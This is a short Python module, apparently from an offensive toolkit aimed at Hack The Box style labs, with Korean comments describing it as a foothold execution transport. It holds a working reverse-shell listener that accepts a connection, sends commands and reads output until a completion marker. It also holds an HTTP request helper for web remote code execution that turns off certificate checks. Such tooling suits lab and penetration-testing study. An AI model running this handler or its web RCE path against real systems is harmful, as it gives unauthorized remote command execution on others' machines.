"""발판 실행 transport — 리버스셸 소켓 / 웹RCE HTTP (사용자 커밋, RCE 실행 표면).

requests 는 web_http_fn 안에서 지연 임포트한다 — 리버스셸 수신(catch_reverse_shell)은 표준
socket 만 쓰므로 requests 미설치 환경에서도 동작하게(선택 의존 분리)."""
import socket

from .shell_session import ReverseShellSession


def catch_reverse_shell(lhost: str, lport: int, timeout: float = 120.0) -> ReverseShellSession:
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", lport))
    srv.listen(1)
    srv.settimeout(timeout)
    conn, _ = srv.accept()
    conn.settimeout(15.0)

    def transport(framed_cmd: str) -> str:
        conn.sendall(framed_cmd.encode() + b"\n")
        buf = b""
        try:
            while b"__HTBDONE_" not in buf:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                buf += chunk
        except socket.timeout:
            pass
        return buf.decode(errors="replace")

    sess = ReverseShellSession(lhost, lport)
    sess.attach(transport)          # 반환 타입과 일치(ReverseShellSession)
    return sess


def web_http_fn(spec: dict) -> str:
    import requests  # 지연 임포트(선택 의존) — 소켓 수신 경로와 분리
    r = requests.request(spec["method"], spec["url"],
                         params=spec["params"] or None,
                         data=spec["data"] or None,
                         headers=spec["headers"] or None,
                         verify=False, timeout=15)
    return r.text
